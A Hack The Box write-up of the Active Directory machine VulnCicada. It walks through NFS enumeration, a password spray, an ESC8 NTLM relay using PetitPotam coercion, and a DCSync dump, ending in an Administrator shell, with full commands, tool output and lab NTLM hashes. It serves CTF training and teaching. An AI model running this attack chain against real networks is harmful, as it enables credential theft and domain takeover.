---
title: VulnCicada
summary: Medium Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), HTTP (80), RPC (111).
date: 2026-06-01
tags: [Hack The Box, Active Directory, Windows]
difficulty: medium
os: Windows
url: https://app.hackthebox.com/machines/VulnCicada
author: Ethan Bauer
author_url: https://github.com/ethanbauer10
source: https://github.com/ethanbauer10/Obsidian/blob/main/HackTheBox/VulnCicada%20%5BAD%5D/VulnCicada%20%5BAD%5D.md
---

# VulnCicada
## Host file setup

```python
sudo nxc smb 10.129.234.48 --generate-hosts-file /etc/hosts
[sudo] password for kali: 
SMB         10.129.234.48   445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False)
```
- NTLM auth disabled
- SMB signing is enabled

## Enumeration

### Open ports

```python
nmap -p- --min-rate=2000 -sT DC-JPQ225.cicada.vl
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-01 18:22 +0100
Nmap scan report for DC-JPQ225.cicada.vl (10.129.234.48)
Host is up (0.013s latency).
Not shown: 65512 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
111/tcp   open  rpcbind
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
2049/tcp  open  nfs
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
9389/tcp  open  adws
49217/tcp open  unknown
49219/tcp open  unknown
49236/tcp open  unknown
49310/tcp open  unknown
49664/tcp open  unknown
49668/tcp open  unknown
49773/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 65.77 seconds
```

### Nmap

```python
nmap -p 53,80,88,111,135,139,389,445,464,593,636,2049,3268,3269,3389,9389 -A --min-rate=2000 -sT DC-JPQ225.cicada.vl
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-01 18:24 +0100
Nmap scan report for DC-JPQ225.cicada.vl (10.129.234.48)
Host is up (0.015s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-01 17:24:18Z)
111/tcp  open  rpcbind?
| rpcinfo: 
|   program version    port/proto  service
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|_  100005  1,2,3       2049/udp6  mountd
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2026-06-01T17:11:54
|_Not valid after:  2027-06-01T17:11:54
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2026-06-01T17:11:54
|_Not valid after:  2027-06-01T17:11:54
|_ssl-date: TLS randomness does not represent time
2049/tcp open  mountd        1-3 (RPC #100005)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2026-06-01T17:11:54
|_Not valid after:  2027-06-01T17:11:54
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2026-06-01T17:11:54
|_Not valid after:  2027-06-01T17:11:54
|_ssl-date: TLS randomness does not represent time
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-06-01T17:25:44+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Not valid before: 2026-05-31T17:19:31
|_Not valid after:  2026-11-30T17:19:31
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|10|11|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC-JPQ225; OS: Windows; CPE: cpe:/o:microsoft:windows
```

## SMB (445)

Since NTLM is disabled ill have to use kerberos, that means i cannot test for null auth

The Guest account is disabled

## HTTP (80)

The web server is just a default IIS server

But there is a `/certsrv` endpoint, so potentially vulnerable to ESC8??

## RPC (111)

I cannot connect using a null session

## NFS (2049)

```python
nxc nfs DC-JPQ225.cicada.vl            
NFS         10.129.234.48   2049   DC-JPQ225.cicada.vl [*] Supported NFS versions: (2, 3, 4) (root escape:False)
```
Its not vulnerable to root escape!

```python
nxc nfs DC-JPQ225.cicada.vl --shares
NFS         10.129.234.48   2049   DC-JPQ225.cicada.vl [*] Supported NFS versions: (2, 3, 4) (root escape:False)
NFS         10.129.234.48   2049   DC-JPQ225.cicada.vl [*] Enumerating NFS Shares
NFS         10.129.234.48   2049   DC-JPQ225.cicada.vl UID        Perms    Storage Usage    Share                          Access List    
NFS         10.129.234.48   2049   DC-JPQ225.cicada.vl ---        -----    -------------    -----                          -----------    
NFS         10.129.234.48   2049   DC-JPQ225.cicada.vl 4294967294 rw-      12.1GB/15.4GB    /profiles                      Everyone
```
Found the share `/profiles`


### Accessing `/profiles` share
```python
nxc nfs DC-JPQ225.cicada.vl --enum-shares
NFS         10.129.234.48   2049   DC-JPQ225.cicada.vl [*] Supported NFS versions: (2, 3, 4) (root escape:False)
NFS         10.129.234.48   2049   DC-JPQ225.cicada.vl [*] Enumerating NFS Shares Directories
NFS         10.129.234.48   2049   DC-JPQ225.cicada.vl [+] /profiles
NFS         10.129.234.48   2049   DC-JPQ225.cicada.vl UID        Perms    File Size      File Path                                     Access List    
NFS         10.129.234.48   2049   DC-JPQ225.cicada.vl ---        -----    ---------      ---------                                     -----------    
NFS         10.129.234.48   2049   DC-JPQ225.cicada.vl 4294967294 ---      402.0B         /profiles/Administrator/Documents/desktop.ini Everyone       
NFS         10.129.234.48   2049   DC-JPQ225.cicada.vl 4294967294 rwx      1.4MB          /profiles/Administrator/vacation.png          Everyone       
NFS         10.129.234.48   2049   DC-JPQ225.cicada.vl 4294967294 rw-      -              /profiles/Rosie.Powell/Documents/$RECYCLE.BIN/ Everyone       
NFS         10.129.234.48   2049   DC-JPQ225.cicada.vl 4294967294 rwx      402.0B         /profiles/Rosie.Powell/Documents/desktop.ini  Everyone       
NFS         10.129.234.48   2049   DC-JPQ225.cicada.vl 4294967294 rwx      1.7MB          /profiles/Rosie.Powell/marketing.png          Everyone
```


```python
nxc nfs DC-JPQ225.cicada.vl --share '/profiles' --ls '/'
NFS         10.129.234.48   2049   DC-JPQ225.cicada.vl [*] Supported NFS versions: (2, 3, 4) (root escape:False)
NFS         10.129.234.48   2049   DC-JPQ225.cicada.vl UID        Perms  File Size     File Path
NFS         10.129.234.48   2049   DC-JPQ225.cicada.vl ---        -----  ---------     ---------
NFS         10.129.234.48   2049   DC-JPQ225.cicada.vl 4294967294 drw-   4.0KB         /profiles/.
NFS         10.129.234.48   2049   DC-JPQ225.cicada.vl 4294967294 drw-   4.0KB         /profiles/..
NFS         10.129.234.48   2049   DC-JPQ225.cicada.vl 4294967294 drw-   64.0B         /profiles/Administrator
NFS         10.129.234.48   2049   DC-JPQ225.cicada.vl 4294967294 drw-   64.0B         /profiles/Daniel.Marshall
NFS         10.129.234.48   2049   DC-JPQ225.cicada.vl 4294967294 drw-   64.0B         /profiles/Debra.Wright
NFS         10.129.234.48   2049   DC-JPQ225.cicada.vl 4294967294 drw-   64.0B         /profiles/Jane.Carter
NFS         10.129.234.48   2049   DC-JPQ225.cicada.vl 4294967294 drw-   64.0B         /profiles/Jordan.Francis
NFS         10.129.234.48   2049   DC-JPQ225.cicada.vl 4294967294 drw-   64.0B         /profiles/Joyce.Andrews
NFS         10.129.234.48   2049   DC-JPQ225.cicada.vl 4294967294 drw-   64.0B         /profiles/Katie.Ward
NFS         10.129.234.48   2049   DC-JPQ225.cicada.vl 4294967294 drw-   64.0B         /profiles/Megan.Simpson
NFS         10.129.234.48   2049   DC-JPQ225.cicada.vl 4294967294 drw-   64.0B         /profiles/Richard.Gibbons
NFS         10.129.234.48   2049   DC-JPQ225.cicada.vl 4294967294 drw-   64.0B         /profiles/Rosie.Powell
NFS         10.129.234.48   2049   DC-JPQ225.cicada.vl 4294967294 drw-   64.0B         /profiles/Shirley.West
```
I can also list out all the users with profiles, using root escape

Now i can use this to go through all the different users profiles!

So it looks like the administrator and `rosie.powell` both have images in their directories!

```python
nxc nfs DC-JPQ225.cicada.vl --share '/profiles' --get-file 'Rosie.Powell/marketing.png' marketing.png 
NFS         10.129.234.48   2049   DC-JPQ225.cicada.vl [*] Supported NFS versions: (2, 3, 4) (root escape:False)
NFS         10.129.234.48   2049   DC-JPQ225.cicada.vl [*] Downloading Rosie.Powell/marketing.png to marketing.png
NFS         10.129.234.48   2049   DC-JPQ225.cicada.vl File successfully downloaded from Rosie.Powell/marketing.png to marketing.png
```
I cannot download the other PNG, i think its becuase it exists in the administrator directory!

![Screenshot](images/vulncicada/pasted-image-20260601195959.webp)

Looks like ive found a password, that i can try to spray against the users that have profiles!

## Password spray

```python
nxc nfs DC-JPQ225.cicada.vl --share '/profiles' --ls '/' | grep '64.0B' | cut -d '/' -f 3 > users.txt
```
First ill use the command earlier to list the users with a profile, then modify the output and put it into users.txt

```python
nxc smb DC-JPQ225.cicada.vl -u users.txt -p 'Cicada123' -k --continue-on-success                     
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Administrator:Cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Daniel.Marshall:Cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Debra.Wright:Cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Jane.Carter:Cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Jordan.Francis:Cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Joyce.Andrews:Cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Katie.Ward:Cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Megan.Simpson:Cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Richard.Gibbons:Cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Shirley.West:Cicada123 KDC_ERR_CLIENT_REVOKED
```
The user `rosie.powell` is compromised

Her credentials get me read and write access on the `profiles$` SMB share which means i can now get vacation.png from the administrator

The image is not interesting

## Domain Admin via ESC8

```python
certipy-ad find -u rosie.powell@cicada.vl -p 'Cicada123' -stdout -vulnerable -k -no-pass -target 'DC-JPQ225.cicada.vl'
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] KRB5CCNAME environment variable not set
[!] DNS resolution failed: The DNS query name does not exist: DC-JPQ225.cicada.vl.
[!] Use -debug to print a stacktrace
[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'cicada-DC-JPQ225-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'cicada-DC-JPQ225-CA'
[*] Checking web enrollment for CA 'cicada-DC-JPQ225-CA' @ 'DC-JPQ225.cicada.vl'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : cicada-DC-JPQ225-CA
    DNS Name                            : DC-JPQ225.cicada.vl
    Certificate Subject                 : CN=cicada-DC-JPQ225-CA, DC=cicada, DC=vl
    Certificate Serial Number           : 18300EBC3A24E6AD4ED1C49B9CBFF943
    Certificate Validity Start          : 2026-06-01 17:15:33+00:00
    Certificate Validity End            : 2526-06-01 17:25:33+00:00
    Web Enrollment
      HTTP
        Enabled                         : True
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : CICADA.VL\Administrators
      Access Rights
        ManageCa                        : CICADA.VL\Administrators
                                          CICADA.VL\Domain Admins
                                          CICADA.VL\Enterprise Admins
        ManageCertificates              : CICADA.VL\Administrators
                                          CICADA.VL\Domain Admins
                                          CICADA.VL\Enterprise Admins
        Enroll                          : CICADA.VL\Authenticated Users
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled over HTTP.
Certificate Templates                   : [!] Could not find any certificate templates
```


```python
bloodyAD -u Rosie.Powell -p 'Cicada123' -d cicada.vl -k --host DC-JPQ225.cicada.vl add dnsRecord DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA 10.10.15.69
[+] DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA has been successfully added
```
First ill add a DNS record with my IP address.

```python
impacket-ntlmrelayx --adcs -smb2support --template DomainController -t http://cicada.vl/certsrv/certfnsh.asp       
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client RPC loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client WINRMS loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Setting up WinRM (HTTP) Server on port 5985
[*] Setting up WinRMS (HTTPS) Server on port 5986
[*] Setting up RPC Server on port 135
[*] Multirelay disabled

[*] Servers started, waiting for connections
```
This has setup ntlm relay with a valid template `DomainController` which has enrollee rights for domain controllers

```python
nxc smb DC-JPQ225.cicada.vl -d cicada.vl -u rosie.powell -p 'Cicada123' -k -M coerce_plus -o LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\rosie.powell:Cicada123 
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PetitPotam
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        Exploit Success, efsrpc\EfsRpcAddUsersToFile
```
This coerced the DC machine account to connect to NTLMrelayX then send the auth to the vulnerable HTTP endpoint to receive a certificate

```python
[*] (SMB): Received connection from 10.129.234.48, attacking target http://cicada.vl
[*] HTTP server returned error code 200, treating as a successful login
[*] (SMB): Authenticating connection from /@10.129.234.48 against http://cicada.vl SUCCEED [1]
[*] (SMB): Received connection from 10.129.234.48, attacking target http://cicada.vl
[*] HTTP server returned error code 200, treating as a successful login
[*] (SMB): Authenticating connection from /@10.129.234.48 against http://cicada.vl SUCCEED [2]
[*] http:///@cicada.vl [1] -> Generating CSR...
[*] http:///@cicada.vl [1] -> CSR generated!
[*] http:///@cicada.vl [1] -> Getting certificate...
[*] http:///@cicada.vl [2] -> Skipping user  since attack was already performed
[*] http:///@cicada.vl [1] -> GOT CERTIFICATE! ID 88
[*] http:///@cicada.vl [1] -> Writing PKCS#12 certificate to ./DC-JPQ225.cicada.vl.pfx
[*] http:///@cicada.vl [1] -> Certificate successfully written to file
```
Now i have a certificate i can extract a NTLM hash from

```python
certipy-ad auth -pfx DC-JPQ225.cicada.vl.pfx -dc-ip 10.129.234.48                    
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN DNS Host Name: 'DC-JPQ225.cicada.vl'
[*]     Security Extension SID: 'S-1-5-21-687703393-1447795882-66098247-1000'
[*] Using principal: 'dc-jpq225$@cicada.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'dc-jpq225.ccache'
[*] Wrote credential cache to 'dc-jpq225.ccache'
[*] Trying to retrieve NT hash for 'dc-jpq225$'
[*] Got hash for 'dc-jpq225$@cicada.vl': aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3
```
I now have a hash and a ccache for the DC machine account so now i should be able to abuse a DCSync attack!

I can do this with either secretsdump or just in nxc

With nxc:
```python
nxc smb DC-JPQ225.cicada.vl -u 'dc-jpq225$' -H 'a65952c664e9cf5de60195626edbeee3' -k --ntds
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\dc-jpq225$:a65952c664e9cf5de60195626edbeee3 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87:::
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8dd165a43fcb66d6a0e2924bb67e040c:::
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        cicada.vl\Shirley.West:1104:aad3b435b51404eeaad3b435b51404ee:ff99630bed1e3bfd90e6a193d603113f:::
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        cicada.vl\Jordan.Francis:1105:aad3b435b51404eeaad3b435b51404ee:f5caf661b715c4e1435dfae92c2a65e3:::
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        cicada.vl\Jane.Carter:1106:aad3b435b51404eeaad3b435b51404ee:7e133f348892d577014787cbc0206aba:::
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        cicada.vl\Joyce.Andrews:1107:aad3b435b51404eeaad3b435b51404ee:584c796cd820a48be7d8498bc56b4237:::
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        cicada.vl\Daniel.Marshall:1108:aad3b435b51404eeaad3b435b51404ee:8cdf5eeb0d101559fa4bf00923cdef81:::
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        cicada.vl\Rosie.Powell:1109:aad3b435b51404eeaad3b435b51404ee:ff99630bed1e3bfd90e6a193d603113f:::
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        cicada.vl\Megan.Simpson:1110:aad3b435b51404eeaad3b435b51404ee:6e63f30a8852d044debf94d73877076a:::
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        cicada.vl\Katie.Ward:1111:aad3b435b51404eeaad3b435b51404ee:42f8890ec1d9b9c76a187eada81adf1e:::
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        cicada.vl\Richard.Gibbons:1112:aad3b435b51404eeaad3b435b51404ee:d278a9baf249d01b9437f0374bf2e32e:::
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        cicada.vl\Debra.Wright:1113:aad3b435b51404eeaad3b435b51404ee:d9a2147edbface1666532c9b3acafaf3:::
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        DC-JPQ225$:1000:aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3:::
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] Dumped 14 NTDS hashes to /home/kali/.nxc/logs/ntds/DC-JPQ225_DC-JPQ225.cicada.vl_2026-06-01_205635.ntds of which 13 were added to the database
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*] To extract only enabled accounts from the output file, run the following command: 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*] grep -iv disabled /home/kali/.nxc/logs/ntds/DC-JPQ225_DC-JPQ225.cicada.vl_2026-06-01_205635.ntds | cut -d ':' -f1
```

With Secretsdump:
```python
impacket-secretsdump cicada.vl/'DC-JPQ225$'@DC-JPQ225.cicada.vl -hashes ':a65952c664e9cf5de60195626edbeee3' -k -no-pass
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[-] CCache file is not found. Skipping...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8dd165a43fcb66d6a0e2924bb67e040c:::
cicada.vl\Shirley.West:1104:aad3b435b51404eeaad3b435b51404ee:ff99630bed1e3bfd90e6a193d603113f:::
cicada.vl\Jordan.Francis:1105:aad3b435b51404eeaad3b435b51404ee:f5caf661b715c4e1435dfae92c2a65e3:::
cicada.vl\Jane.Carter:1106:aad3b435b51404eeaad3b435b51404ee:7e133f348892d577014787cbc0206aba:::
cicada.vl\Joyce.Andrews:1107:aad3b435b51404eeaad3b435b51404ee:584c796cd820a48be7d8498bc56b4237:::
cicada.vl\Daniel.Marshall:1108:aad3b435b51404eeaad3b435b51404ee:8cdf5eeb0d101559fa4bf00923cdef81:::
cicada.vl\Rosie.Powell:1109:aad3b435b51404eeaad3b435b51404ee:ff99630bed1e3bfd90e6a193d603113f:::
cicada.vl\Megan.Simpson:1110:aad3b435b51404eeaad3b435b51404ee:6e63f30a8852d044debf94d73877076a:::
cicada.vl\Katie.Ward:1111:aad3b435b51404eeaad3b435b51404ee:42f8890ec1d9b9c76a187eada81adf1e:::
cicada.vl\Richard.Gibbons:1112:aad3b435b51404eeaad3b435b51404ee:d278a9baf249d01b9437f0374bf2e32e:::
cicada.vl\Debra.Wright:1113:aad3b435b51404eeaad3b435b51404ee:d9a2147edbface1666532c9b3acafaf3:::
DC-JPQ225$:1000:aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3:::

...[SNIP]...
```
Now i can use this hash to get access as the administrator, but since winrm isnt open i can either use wmiexec or psexec.

```python
impacket-wmiexec cicada.vl/Administrator@DC-JPQ225.cicada.vl -hashes ':85a0da53871a9d56b6cd05deda3a5e87' -k -no-pass
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] SMBv3.0 dialect used
[-] CCache file is not found. Skipping...
[-] CCache file is not found. Skipping...
[-] CCache file is not found. Skipping...
[-] CCache file is not found. Skipping...
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
cicada\administrator

C:\>cd /Users/Administrator
C:\Users\Administrator>cd Desktop
C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is D614-4931

 Directory of C:\Users\Administrator\Desktop

04/10/2025  11:00 PM    <DIR>          .
09/13/2024  09:10 AM    <DIR>          ..
09/15/2024  06:26 AM             2,304 Microsoft Edge.lnk
06/01/2026  10:20 AM                34 root.txt
06/01/2026  10:20 AM                34 user.txt
               3 File(s)          2,372 bytes
               2 Dir(s)   3,451,203,584 bytes free

C:\Users\Administrator\Desktop>
```


```python
C:\Users\Administrator\Desktop>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State  
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled

C:\Users\Administrator\Desktop>
```
Domain Admin!
